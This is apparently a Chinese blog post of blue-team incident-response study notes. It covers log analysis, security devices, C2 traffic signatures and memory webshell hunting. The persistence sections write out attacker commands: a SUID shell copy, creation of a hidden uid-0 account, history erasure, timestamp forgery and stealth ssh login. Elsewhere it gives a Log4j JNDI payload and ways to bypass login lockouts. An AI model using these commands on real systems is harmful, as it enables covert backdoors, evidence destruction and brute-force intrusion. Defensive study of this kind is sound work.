---
title: "应急响应流程和网络安全常识"
date: 2024-04-18
description: "pdcerf"
tags: ["蓝队理论"]
featured_image: ""
# images is optional, but needed for showing Twitter Card
images: []
categories: "sec"
comment: false
draft: false
---

pdcerf：准备-检测-抑制-根除-恢复-总结。

### 准备

明确职责；梳理资产，梳理暴露面，关闭不必要的映射；检查弱口令和密码策略；更新漏洞补丁；确认资产开启了日志存储，可对日志进行监控、审计和溯源。

准备阶段首先要确定能够找到和打开日志文件。

---

#### https 加密原理，抓包工具怎么截获明文 https 报文

http/s 本身是加密通信的，我们在抓包工具里面看到的明文数据包，是抓包工具自动截获密钥之后解密的结果。

https 加密方式：先使用非对称加密传输 ssl 证书并建立连接，再使用对称加密传输数据。这里非对称加密意味着只有一方需要提供 ssl 证书。

http 不安全的原因：对称加密导致的中间人攻击，中间人查看和篡改请求包、响应包，或者跳转到恶意网站。

只使用非对称加密不可行的原因：传输效率太低了。

burpsuite 抓 https 明文的方法就是对自己进行一次中间人攻击，分别与浏览器和服务器建立 https 连接。能够对 https 报文进行加密解密，就叫建立 https 连接。

burp 先是截获了服务器给浏览器的公钥。然后在 burp 上生成公私钥，将 burp 的密钥发给浏览器。之前配置 burp 的时候浏览器已经导入了 burp 的证书，这样 burp 和浏览器建立了 https 连接，使用的是 burp 的密钥，所以 burp 可以解密看到明文的 https 请求。同理，burp 再与服务器建立 https 连接，可以看到明文 https 响应。

数据传输的过程中 burp 有两套对称加密的密钥，分别用来和浏览器/服务器进行加密通信。

其他工具例如 wireshark 也可以抓 https 明文，但是原理不同，wireshark 是先将浏览器 ssl 日志设置环境变量，再将 ssl 日志路径设置到 wireshark 里面，让 wireshark 读取 ssl，进行解密，整个过程只有一套密钥。

---

#### java 内存马的原理

客户端向 java web 服务器发起的请求会依次经过 listener，filter，servlet 三个组件。

java 内存马的原理就是利用类加载或 Agent 机制在 JavaEE、框架或中间件的 API 中动态注册一个可访问的后门。

java 内存马分为两类：servlet-api 型内存马，动态注册 web 组件；字节码增强型内存马，通过 instrumentation 动态修改已有代码。

动态注册是指通过 rce 注册新的 listener，filter，servlet 组件，或者特殊框架的特殊组件，例如 spring 的 controller 内存马，tomcat 的 valve 内存马。

---

#### 常见安全设备的种类和功能

终端安全响应（edr）：例如，奇安信天擎。部署在终端，可以理解为高级杀软，和传统杀软的区别在于 edr 是基于文件行为进行检测的，而传统杀软停留在文件签名的检测。edr 的检测范围包括硬件信息、系统信息、网络信息等，也可以检测带有威胁的网络请求，和 ips/ids 的区别在于，ips/ids 是基于流量进行检测，而 edr 是基于终端文件行为进行检测。

流量威胁检测（ips/ids）：例如，奇安信天眼。高级威胁检测、异常行为检测、告警响应处置、攻击回溯分析。ips/ids 是监控入站出站流量，进行检测分析和响应处置。

态势感知：一个额外的大数据平台，从其他安全设备采集信息，对网络中的攻击、威胁、漏洞和资产执行动态整合，通过大数据处理及整合能力，从全局视角把握整个网络的安全状态。

威胁情报平台：漏洞情报、攻击者档案库、邮件攻防检测、对接数据平台、联动云端情报。

蜜罐：蜜罐技术是一种主动防御技术，通过部署没有真实业务数据的系统来诱骗攻击者实施攻击，记录其攻击行为从而学习攻击者的攻击目的和攻击手段，以此不断提升真实业务系统的安全防护能力。

防火墙：按照一定的规则自动决定是否允许入站和出站流量通过，阻断不受信任的网络连接。

堡垒机：也称为运维审计系统，是集中进行权限控制和安全审计的服务器，置于客户端和网站服务器之间。

---

#### windows 日志文件

日志文件存储在目录 C:\Windows\System32\winevt\Logs 里面。其中 System.evtx, Application.evtx, Security.evtx 这几个日志比较有用。系统日志和应用程序日志对系统管理员更为有用，记录的是故障排除信息；安全日志对调查员更为有用，记录登录、远程访问、进程追踪、身份认证、特权使用、策略变更等涉及安全的事件。

需要现场检查主机是否开启了日志的审核策略，例如 windows server 2008 r2 默认不开启审核策略，需要手动开启。

按 win+r 输入 eventvwr.msc 可以打开事件查看器。事件 id 有默认的含义：4624 登录成功；4625 登录失败；4634 注销成功；4647 用户启动的注销；4672 使用超级用户（如管理员）进行登录；4720 创建用户。

---

#### linux 日志文件

默认存放在 /var/log 目录下。

使用 more /etc/rsyslog.conf 查看日志的配置。

系统出现问题首先检查 /var/log/message，里面记录了系统的重要信息。

/var/log/secure 记录了身份认证和权限管理方面的信息，例如 ssh 登录、su 切换用户，sudo 授权。

登录方面有四个文件可供查看，都是二进制文件，不能用 vi 打开，要用特殊的命令查看。/var/log/wtmp 记录全部的登录信息，使用 last 命令查看；/var/log/utmp 记录目前处于登录状态的用户，使用 w,who,users 等命令查看；/var/log/btmp 记录错误登录，使用 lastb 命令查看；/var/log/lastlog 记录所有用户最后登录时间，使用 lastlog 命令查看。

---

#### linux 日志分析常用命令

    w   可以查看当前已登录的用户和他们的会话信息。

    last   可以查看最近所有登录和注销会话的用户列表以及日期和时间。

    lastlog   可以查看所有用户最后一次登录的时间和位置。

    who /var/run/utmp   可以查看当前登录的用户。

    top 可以查看当前占用 cpu 和内存的进程。

    find -iname "name" | xrags grep -in "word"   可以查看文件名包含 name 而文件内容包含 word 的文件，并显示 words 出现在第几行。-i 忽略大小写，-n 显示行数。

    cat filename | tail -n +5 | head -n 10   可以查看文件的第 5 行开始的 10 行，tail 用来查看新添加的日志信息。

    tail -f /var/log/messages 可以实时监控日志信息。

    awk '/error/ {print $0}' /var/log/messages 可以筛选出包含 error 字符串的日志信息。

    awk -F: '$3==0{print $1}' /etc/passwd   可以查看除了 root 之外还有哪些特权用户（uid=0）。

    grep error /var/log/messages   可以查找系统日志中的错误信息。

    grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'   可以查看登录成功的日期、用户名、ip。

    grep "Failed password for root" /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr | more   可以查看正在爆破主机 root 密码的 ip 有哪些。

    grep "useradd" /var/log/secure   可以查看增加用户的记录。

    grep "userdel" /var/log/secure   可以查看删除用户的记录。

    netstat -ntlp | grep ":80 " | awk '{print $7}' | tr '/' "\t"   可以根据端口列进程，80 改为任意端口。

---

#### 给你一个比较大的日志，应该如何分析

当面对一个比较大的日志文件时，通常需要采用以下几个步骤进行分析：

1. 对日志文件进行预处理：如果日志文件比较大，首先可以考虑对其进行切割、筛选等操作。例如，可以使用Linux系统中的split命令将大型日志文件拆成多个小文件，以便于后续的处理。
2. 确定日志格式：在分析日志之前，需要了解日志的格式，例如时间戳、事件类型、IP地址等信息。这有助于我们快速定位和分析日志中的内容。
3. 使用工具进行分析：目前市面上有很多针对日志分析的软件工具，例如ELK Stack（Elasticsearch、Logstash、Kibana）、Splunk等。这些工具能够帮助我们更加高效地分析、搜索和可视化日志数据。
4. 定义分析目标：在开始分析日志之前，需要明确所需得到的结果以及要回答的问题。例如，我们可能需要查找某个特定的事件或行为、识别与安全相关的异常或潜在威胁等。
5. 进行分析并记录结论：根据分析目标，采用相应的方法和工具对日志文件进行分析，并记录分析结论。同时要把发现的异常或有用的信息进行整理和汇总。
6. 采取相应措施：根据分析结果，确定需要采取的措施。例如，修复漏洞、更新安全策略、加强访问控制等。

需要注意的是，在处理大型日志文件时，可能会消耗较多的时间和计算资源。因此，可以通过合理地利用计算机硬件（例如使用多核CPU和高速磁盘）来提高处理效率。同时也可以将任务分解成多个小部分进行并行处理，以进一步提升分析效率。

---

#### tcp/ip 四层架构对应的常见网络协议

应用层：http/s，dns，ftp，ssh，dhcp；

传输层：tcp，udp；

网络层：ip，arp，icmp，路由选择协议（rip，ospf，bgp），nat；

网络接口层：以太网 Ethernet，基于以太网的点对点通讯协议 PPPoE

---

#### tcp 和 udp 的区别

tcp 是面向连接的协议，发送数据前需要三次握手；udp 是无连接的协议，不需要提前确认连接就可以发送数据。

tcp 可靠，序号+握手+重传，保证了可靠性；udp 不可靠，需要应用层额外的设计来保证可靠性。

tcp 有序，后发送的数据先到达了，tcp 会按照序号重新排序；udp 无序。

tcp 传输慢；udp 传输快。

---

#### dns 使用的是 tcp 还是 udp

dns 通常使用 udp，在请求包较大时使用 tcp。因此使用 dns 的请求不易被 tcp 的抓包工具截获。

---

#### 什么是 ipv4 地址的 a 段 b 段 c 段，子网掩码有什么作用

A 类是 1.0.0.0 到 126.0.0.0；B 类是 128.0.0.0 到 191.255.255.255；C 类是 192.0.0.0 到 223.255.255.255。此外还有 D 类和 E 类。

ABC 三类 ip 分别有私有 ip 段。

10.0.0.0～10.255.255.255

172.16.0.0～172.31.255.255

192.168.0.0～192.168.255.255

子网掩码用来标识网络地址和主机地址，将网络划分为若干子网。

---

#### 什么是 webshell，常见的 getshell 方法

webshell 是 web 服务器的后门，攻击者利用 webshell 拿下服务器的控制权限，并且是持久性控制。后门是一个总称，木马的作用就是植入后门，webshell 就是一种特殊的木马。

常见的 getshell 方法有：

（1）利用弱口令进后台传 webshell。

（2）利用任意文件上传漏洞传 webshell。

（3）利用 rce 漏洞写 shell，植入多个后门并扩大危害。

（4）利用文件包含漏洞/解析漏洞，解析图片马。

（5）sql 注入写 shell。

---

#### 上传 webshell 之后怎样获得绝对路径

看返回包；报错信息；fuzz；再传一个 php 探针。 

---

#### webshell 不出网如何利用

正向代理，建立 http 隧道；找能出网的协议，例如 dns，icmp 等。

---

#### 正向代理和反向代理的区别和用途

正向代理即客户端代理。用途：（1）访问原来访问不到的资源；（2）缓存，加速访问；（3）隐藏访问者的信息。

反向代理即服务器端代理。用途：（1）保证内网安全；（2）实现负载均衡，优化网站负载。

---

#### 内网穿透是什么

外网无法直接访问内网，搭建一个隧道访问特定的内网主机或服务，称为内网穿透，也成为 nat 穿透。

---

#### 游戏加速器与内网穿透

nat 原理：外网 ip 到 内网 ip 的转换，根据 nat 类型对网络请求进行限制，阻断对内网的直接访问。

游戏加速器原理：复用映射关系实现游戏流量的 nat 穿透。先进行一次内网穿透，将映射关系记录在 nat 路由表中，之后游戏流量经过的时候使用这个映射，就改变了 nat 类型。

udp 穿透和 tcp 穿透流程是一样的，但是 tcp 的握手容易导致穿透失败，例如 nat 收到 rst 报文后删除了映射、nat 开启了 syn 过滤。

---

#### 钻石票据、黄金票据、白银票据的区别

白银票据通常用于攻击域控，黄金票据则用于拿下域控后权限维持，且黄金票据是伪造发票人，而白银票据则是伪造门票。钻石票据能够以任意用户的身份访问任意服务。

---

#### 设置蜜罐的时候开放哪些端口，理由是什么

数据库：1433 sqlserver；1521 oracle；3306 mysql。

远程连接：22 ssh；3389 rdp。

主机：21 ftp；53dns；23 telnet。

web：7001-7002 weblogic；8080 jboos/tomcat；6379 redis。

---

#### 暴力破解密码的时候遇到登录失败次数限制怎么绕过

（1）在请求包添加 xff 请求头进行欺骗。

（2）双写 xff 请求头。

（3）设置代理池，例如用 burp 插件轮换 ip。

（4）如果不是封禁 ip 而是封禁账号，则遍历用户名导致全站用户无法登录，业务瘫痪。

---

#### 常见的反爬虫策略

访问频率检测；封 ip；封 user-agent/cookie/referer 等请求头；设置验证码；引用外部 js 进行动态渲染；敏感信息引入外部链接；ajax 异步传输；流量加密传输。

---

#### 渗透测试的流程

确定目标-信息收集-发现漏洞-利用漏洞-内网渗透-输出报告

---

#### 信息收集的思路

---

### redis 未授权访问是什么，怎么利用能做到 rce

redis 是开源的内存数据库，提供高性能的键值对存储系统，常用于缓存、消息队列、会话存储等应用场景。

redis 未授权访问的条件：（1）redis 默认的 6379 端口可以在公网访问；（2）redis 密码默认为空，如果设置了弱口令可以爆破。

漏洞原理：公网访问 6379 端口并使用弱口令登录 redis 数据库，使用 redis 自带的 config 命令进行 getshell。

后续 rce 利用及其条件：（1）写 ssh，需要服务器有 .ssh 目录并且 redis 有写入权限。（2）写 webshell，需要知道 web 的绝对路径。

---

### ssrf 用 redis 提升为 rce

用 dict 协议探测，用 gopher 协议写入。需要知道 web 的绝对路径，例如 /var/www/html。

---

#### 给定域名绕过 cdn 找真实 ip

cdn 即内容交付网络，通过缓存，实现降低延迟和均衡负载的功能。

找真实 ip 的方法：查询 dns 解析记录；通过 ssl 证书查询真实 ip；用 fofa 等测绘工具直接搜；...

---

### 检测

研判攻击流量，保留攻击证据，确定影响的程度和范围，后期和其他厂商联动溯源，最终生成一个防守报告。

研判需要对安全设备（天眼、蜜罐、入侵检测、堡垒机、态势感知）和威胁情报平台（微步）比较熟悉。

---

#### 传统漏洞攻击流量特征

见 top10 和流量特征专题。

---

#### java 反序列化攻击流量特征

见 top10 和流量特征专题。

---

#### 常见 webshell 管理工具的流量特征

见流量特征专题。

---

#### cs 流量特征

默认 beacon 每隔六十秒发一个心跳包，通过 cookie 携带靶机信息。

木马运行后会从指定服务器下载 stage，这个文件的大小约等于 211kb。下载路径是随机生成的，但是其 ascii 之和模 256 余 92。

下发任务的方法是 c2 服务器在心跳包的响应里发送任务。

beacon 使用 post 回传数据并且 url 为 /submit.php?id=

stageless 阶段不需要下载 stage，但是可以看到 c2 服务器会返回 0.0.0.0 确认 beacon 上线。

stageless 阶段的流量特征是使用 A/TXT/AAAA 三种方式发放 payload，且看到 ip 为 0.0.0.241/0.0.0.243/0.0.0.245。

---

#### msf 流量特征

MSF（Metasploit Framework）是一个开源的网络安全测试工具，可以用于对系统进行渗透测试和漏洞分析。在使用 MSF 进行攻击时，会产生一些特定的流量特征，包括以下几个方面：

1. 目标端口：MSF 框架使用多种不同的攻击模块来利用目标系统的漏洞，因此 MSF 流量通常涉及多个不同的目标端口，例如常见的 80、443、445 等端口。
2. 异常请求：MSF 框架使用恶意代码来对目标系统进行攻击，因此 MSF 流量中通常会出现大量异常请求，例如尝试访问非法 URL、发送恶意数据包等。
3. 频繁扫描：为了寻找目标系统的漏洞，MSF 框架通常会频繁地进行端口扫描、服务识别等操作，因此 MSF 流量中通常会出现大量扫描和探测请求。
4. 数据包大小：由于 MSF 框架通常会向目标系统发送大量恶意数据包，因此 MSF 流量中通常会出现较大的数据包大小。
5. 特殊协议：在攻击过程中，MSF 框架通常会使用一些特殊的协议，例如 Meterpreter、Reverse TCP 等，这些协议在 MSF 流量中通常表现出特定的流量特征。

总之，在分析 MSF 流量时，需要综合考虑多个方面的特征，并结合具体的攻击模块和服务进行分析。同时，也需要使用适当的工具和技术，例如网络抓包工具、IDS/IPS 等，来对 MSF 流量进行捕获和分析。

---

#### 其他红队工具的流量特征

见流量特征专题。

---

#### 从几万条告警中区分攻击和误报

看 wireshark 判断是否为正常业务。

（1）可以记录正常业务的特征，从而在告警信息中排除正常业务。

（2）查看 ip，排除内部人员操作引起的误报。

（3）如果是扫描引起的误报，可以根据返回包的状态码和返回包大小进行判断。例如发现攻击者扫描 c 段 ip 但是返回 403 则忽略这次误报。

（4）从“待分析告警”中提取 exp，例如发现攻击者使用了某个组件 nday 的 exp，但是我们发现网站根本没有使用这个组件，则忽略这次误报。

---

#### 判断事件类型

根据告警确定事件类型，如果是真实攻击则封禁 ip，并检测是否利用成功。

常见的事件类型有勒索/挖矿/蠕虫/钓鱼/文件上传/webshell/反弹shell/外联/敏感操作等。

---

#### 判断失陷范围

根据安全设备确定受到影响的主机和资产。

---

#### 从告警内网 ip 确定在哪一层楼

（1）通过内网 ip 的掩码缩小搜查范围。

（2）通过 arp 请求获取 ip 的 mac 地址；

（3）从路由器 arp 缓存表找到 mac 地址对应的端口；

（4）找到设备所在位置。

---

#### 内网告警的处理方式

（1）根据告警信息定位到出现问题的设备；

（2）判断是否为蜜罐。

（3）如果是内网扫描先隔离；

（4）根据事件类型进行主机排查；

（5）根据日志文件进行溯源反制。

---

#### 怎么判断木马是否上传成功

看数据包响应码，看到 200/500 判断为疑似成功，看到 400 判断为失败；

访问木马上传路径；

自己复现攻击。

---

#### 怎么在百万行代码中找到后门

文件对比。直接用文件对比工具、git 等版本控制工具进行文件对比、验证文件 hash 进行对比、使用 diff 命令进行文件对比。

---

#### 天眼使用经验

---

#### windows 入侵排查

（1）注册表-排查新增账号、远程控制

命令行 net users 可以看到主机的账号列表，但是看不到隐藏账号。使用注册表可以进一步排查隐藏账号。在 windows 搜索栏打开注册表编辑器，找到 HKEY_LOCAL_MACHINE\SAM，发现无法看到后续内容，右键编辑权限，选择管理员完全控制，然后重新打开注册表。找到

    计算机\HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names\

即可看到全部账号信息。

注册表可以看远程桌面调用历史。

    计算机\HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\

（2）任务计划程序-排查恶意脚本

系统搜索任务计划进行排查。

（3）命令行-排查异常端口

打开命令行，输入
    
    netstat -ano

可以看到当前网络连接、端口号、进程 pid。

（4）任务管理器-排查可疑进程、启动项

选择详细信息可以看到 pid；右键可以看到文件所在位置；启动应用可以看到启动项。

（5）服务-排查异常服务、禁用远程注册表

系统搜索服务即可打开服务的管理页面。

找到 remote registry 选择禁用（如果攻击者有  则这个操作聊胜于无）。

（6）事件查看器-日志分析

系统搜索事件查看器，打开之后找到 windows 日志，通过事件 id 进行排查。

1149 远程桌面；4624 登录成功；4625 登录失败；4634 注销成功；4647 用户启动的注销；4672 使用超级用户（如管理员）进行登录；4720 创建用户。

---

#### linux 入侵排查

见上文 linux 日志分析部分。除了日志分析，还需要使用一些查杀木马后门的工具进行检测，例如用 rkhunter 查杀 rootkit 隐匿软件，用 clamav 查杀病毒。

---

#### 负载均衡之后如何获得真实 ip

看 xff 头，xff: 真实ip，代理ip-1，代理ip-2，...

---

### 抑制

---

#### 中勒索病毒了怎么办

在奇安信/360/腾讯/启明等企业的病毒库里面搜索，有解密工具。

---

#### 已知攻击者正在利用 log4j2 漏洞，怎么应急

（1）根据 log4j2 特征 ${jndi} 在日志中进行搜索，找到漏洞点和攻击者信息，封禁攻击者 ip。

（2）在防火墙的出站策略中阻断对常见 dnslog 平台的访问。

（3）排查内存马并清除。

（4）通知客户升级组件，进行安全加固。

（5）对攻击者进行溯源。

---

#### 排查和阻止内网移动

如果一台主机在内网进行横向攻击，建议采取以下措施：

1. 隔离受感染的主机：立即将受感染的主机隔离，防止攻击者继续向其他主机传播恶意软件。

2. 停止该主机的网络访问：为了避免感染蔓延到其他网络节点，需要立即停止该主机的网络访问。

3. 收集攻击信息：记录并收集有关攻击者、攻击方式和攻击原因的信息。这些信息有助于后续的调查和取证工作。

4. 清除恶意软件：使用杀毒软件或恶意软件清理工具对受感染的主机进行扫描和清理，确保所有恶意文件都被删除。

5. 升级系统补丁：检查受感染主机是否存在已知漏洞，并及时安装相应的系统补丁，以防止攻击者再次利用已知漏洞进行攻击。

6. 取证和分析：对受感染的主机进行取证和分析，以确定攻击者的入侵路径和方法，为后续的防御和修复工作提供参考。

7. 加强安全防护：加强内网安全防护，定期进行内网安全扫描和审核，及时发现并修复安全漏洞。

总之，在一台主机在内网进行横向攻击时，需要尽快采取以上措施，避免恶意软件感染蔓延到其他网络节点，最大程度保护整个内网的安全。

---

#### windows 权限维持方法

（一）隐藏文件

（1）设置后门的文件属性为隐藏文件和系统文件。

命令为：

    attrib +s +a +h +r D:\test\project\test.txt

这些参数设置文件属性为系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。对于这个属性的设置，windows 文件夹的显示隐藏项目是无效的，从而做到了隐藏后门。

（2）将后门伪装成正常文件。

（3）对后门进行驱动级文件隐藏。

用工具 easy file locker，可以做到驱动级文件隐藏，网站相关目录下找不到相关文件。防守方的排查方法是在 c:\windows\ 里面找可疑内容。

（二）隐藏账号

可以用注册表先导出再导入 .reg 文件建立一个克隆账号，这个账号只能在注册表里面看到，用命令行查询或者查看系统用户都看不到这个隐藏账号。蓝队排查可以用 D 盾。

（三）端口复用

将后门和其他应用程序绑定同一个端口，借用其他程序的端口收发信息，避免后门开放新的端口。

需要对非后门信息进行回环转发。

（四）进程注入

进程注入技术有很多种，改注册表可以进一步实现注入的持久性。

红队工具 msf/cs 等都带有进程注入功能。将恶意代码注入到其他进程，可以实现无文件攻击，可以穿墙。

蓝队排查可以找红队工具的心跳包，心跳间隔取决于红队设置，一般是固定一分钟一个。

（五）注册表自启动

修改注册表实现开机自动开后门，防止重启后门掉线。

（六）组策略设置自动运行脚本

运行 gpedit.msc 进入本地组策略，开机自动运行恶意脚本。隐蔽性很高，但是需要知道脚本的绝对路径。

（七）计划任务

使用 windows 的任务计划程序设置每隔一分钟运行一次恶意脚本。

（八）服务自启动

在 windows 服务设置里面设置开机自动启动一个服务，结合 shell 实现无文件后门。

---

#### linux 权限维持方法

（一）隐藏文件

用 chattr 命令防止 ls -l 查看。

    chattr +i evil.php   锁定文件

（二）篡改时间戳

用 touch 命令就可以改。

    touch -t 1401021042.30 webshell.php

（三）删除历史记录

禁用 history，带有空格的不记录。

    [space]set +o history

或者在 history 里面删除恶意语句。

    history | grep "keyword"

    history -d [num]

（四）ssh 隐身登录

登录信息无法被 w/who/last 等指令检测到。

    ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i

（六）端口复用

借用其他应用程序的端口，达到隐藏端口的目的。

（五）隐藏进程

让 root 无法通过相关指令查询到攻击者使用的进程，例如用 top 看到 cpu 占用率高却看不到相关进程。

红队可以用 libprocesshider 工具实现隐藏进程，蓝队可以用 unhide 寻找隐藏进程进行网络取证。

（六）进程注入

linux 下可以用 linux-inject。

（七）创建用户

普通用户利用 suid shell 可以用 guest 用户登录暂时获取 root 权限。

    cp /bin/bash /tmp/shell

    chmod u+s /tmp/shell

用 useradd 命令可以创建 root 用户。

    useradd -p `openssl passwd -1 -salt 'salt' 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test

（八）设置 ssh 公私钥

之后可以用自己设置的 ssh 密钥进行隐身登录，达成权限维持。

（九）定时任务

用 crontab 命令定时运行脚本。蓝队可以用 crontab -e 排查。

（十）openssh 后门

确定目标主机 openssh 版本、下载源码、添加后门。

---

#### windows 提权

烂土豆配合令牌窃取进行提权：所谓的烂土豆提权就是俗称的MS16-075，其是一个本地提权，是针对本地用户的，不能用于域用户。可以将Windows工作站上的特权从最低级别提升到“ NT AUTHORITY \ SYSTEM” – Windows计算机上可用的最高特权级别。

注册表提权：注册表 AlwaysInstallElevated 是策略设置项，允许低权限用户以 system 权限运行安装文件；还可以将伪造的服务用注册表写入，那么运行服务的时候是 system 权限。

---

#### linux 提权

脏牛提权；suid 提权；find 提权；git 提权；...

---

#### sql 的 udf 提权

适用场景：已经 getshell，发现数据库有系统权限，利用数据库进行提权。

利用条件：sql 有高权限、可读写 udf.dll（例如 root 默认有读写权限），已经 getshell 或者 sql 的安全配置允许导入 shell（例如 mysql 的 secure_file_priv 置空）

加固方法：调低数据库的权限，安全设置里面不允许读写文件。

提权流程：在 getshell 之后确认数据库有高权限并且满足 udf 提权的条件；查看 sql 的安装路径；根据 sql 的类型和版本确定传入 udf 的位置，例如查看 plugin 所在目录；制作 udf 文件；通过 shell 或 hex 编码传入 udf 文件；命令执行；功成身退，擦除痕迹。

---

### 根除

---

#### 怎样排查内存马

（1）heapdump 内存排查。用 heapdump 和 grep 命令进行查找。

    heapdump

    strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof | grep "POST /"

    strings /var/cache/tomcat/temp/heapdump2022-10-19-12-464292342944555007800.hprof | grep -E "/webapps/.*?\!" | sort -u

（2）如果是 jsp 注入，在日志文件中排查 jsp 的访问请求，通过特征查找内存马 

    find / -name *.jsp | xargs grep "pass" 

（3）如果是 rce，查看中间件的 error.log，判断攻击时间和手法；

（4）根据告警的 url 查找日志，大量相同路径不同参数的请求，页面不存在但是返回 200 则可能有内存马。

（5）特殊的 classloader 加载（例如 Templateslmpl 和 bcel），对应的 classloader 路径下没有 class 文件。

（6）结合冰蝎和哥斯拉的 webshell 流量特征进行判断。

（7）利用检测工具（arthas/牧云，java instrument 技术），检测 filter 类型，agent 类型。

---

#### 怎样清除内存马

（1）客户允许的话，重启。

（2）删除 filter 中的恶意代码。

（3）中间件注销 filter。

（4）使用工具 arthas，VisualVM

---

#### 内存马无文件落地，怎么取证

/var/log/ 日志取证，结合流量特征用 grep 命令按照正则表达式搜索；/var/cache 缓存取证，结合流量特征用 grep 命令按照正则表达式搜索；检测工具，例如 arthas。

---

#### java web 中 servlet/filter/listener 的区别

servlet 是处理请求的动态资源；filter 是过滤器，可以修改请求和响应；listener 是监听器，可以监听并加载一些插件。

servlet: 冰蝎内存马

filter: struts2

listener: spring, log4j

---

#### log4j2 原理和流量特征

log4j2 是日志组件，其 lookups 机制存在 jndi 注入。

判断利用是否成功：（1）出网一般走 rmi/ldap/dns，配合 ids 查看目标主机是否外带攻击；（2）查看目标主机是否存在 dnslog 活动；（3）查看是否下载恶意类。

log4j2 的特征是 ${}，例如 ${jndi:ldap://0.0.0.0:80/exploit}

log4j2 使用 jndi 注入，找恶意 url。

log4j2 流量可以看到 rmi 或者 ldap 字样。

log4j2 流量会出现 dns/ip 相关特征。

log4j2 混淆绕过会使用冒号，例如 ${::::-j}${what:-n}

log4j2 的影响范围包括：log4j1.x，spring boot，struts2, solr, vmware 产品线, flink, druid

---

#### shiro 550 和 721 的区别

攻击方法的区别：550 密码撞库，721 填充攻击。

shiro550 的 cookie 会有一个 rememberme 的值，并且这个值是很长的一个字符串。

shiro550 使用 aes+base64 加密，密钥写死在代码里面。知道了密钥可以碰撞解密，写 payload 再加密，替换原来的 rememberme 字段，这个 rememberme 最终被反序列化，payload 被后端解析。

shiro721 不需要知道 key，但是需要一个合法登录用户的 cookie 进行 padding oracle 填充攻击。

---

#### shiro 利用链

无依赖利用链，具体情况可以使用工具 ysoserial。

因为我们知道 Shiro 原生类中是不存在 Commons-Collection CC 依赖的时候我们就无法通过 CC 链进行攻击，我们就需要另外找一个无依赖的方式对 Shiro 的反序列化漏洞进行利用：例如通过 Shiro 自带的依赖 Commons-Beanutils 进行攻击。

---

#### fastjson rce 的流程

简单描述一下 fastjson rce 的流程。攻击者的 payload 被受害者的服务器反序列化解析后，通过 jndi 连接攻击者指定的 rmi 服务器。攻击者 rmi 服务器向受害者服务器返回一个对象。受害者服务器检测到本地不存在该对象，向攻击者提供的地址请求恶意 class 文件。受害者服务器收到 class 文件后加载进内存，实例化的时候执行构造函数，完成 rce。

---

#### 怎样定位 webshell

查看安全日志；查看敏感目录；查看未知端口、未知进程；使用杀毒软件，D盾，进行扫描和查杀。

---

#### 怎样清除 webshell

终止进程；删除相关文件。

---

#### 杀了 webshell 还有外连流量怎样应急

（1）有可能没有完全清除 webshell；

（2）有可能其他系统被感染了，进行流量监测找到外连流量对应的系统和设备；

（3）有可能攻击者在 getshell 之后植入了后门程序，查找可疑进程，同时进行流量监测。

---

#### 攻击者清理了作案痕迹怎么办

（1）使用 lsof 恢复被删除的文件；

（2）查看日志是否有新增加的用户。

---

#### 溯源反制手段有哪些

找到攻击者的真实 ip 地址，得到物理地址。

在威胁情报平台查询 ip 的关联事件。

如果是服务器 ip，通过网络空间测绘查询该 ip 的其他网段。

通过攻击 ip 历史 dns 解析记录/ip 反查域名，进行溯源分析。

提取样本特征、用户名、ID、邮箱、C2服务器等信息，对攻击者 id 进行追踪，通过社交平台获取攻击者个人信息。

---

#### 威胁情报平台使用经验

将 ip 放进去搜索即可。

微步：威胁分析与情报共享社区

安恒：安全星图平台

---

#### 什么是攻击者画像

攻击目的、网络代理、攻击手法；

虚拟身份、真实身份、联系方式、组织情况。

---

### 恢复

---

#### 怎么恢复失陷主机的文件

找小伙伴帮忙。

---

### 总结

---

#### 攻击事件调查报告

确定告警真实性之后要生成一个攻击事件调查报告，包含以下内容。

（1）攻击者最初的攻击媒介是什么？

（2）攻击者如何访问环境？

（3）攻击者是否利用漏洞获得了访问权或特权？

（4）攻击者如何维持权限进行指挥和控制？

（5）攻击在网络或设备上是否有持久性？

（6）持久性的方法是什么？（例如后面、shell、合法凭证、远程工具）

（7）哪些账号已经被盗用，分别是什么权限？

（8）使用什么方法进行侦察？

（9）是否发生横向移动，方法是什么？（例如 rdp，恶意软件，用户账号）

（10）数据是否被泄露，类型是什么，方法是什么？

---

#### 写过技站法吗

 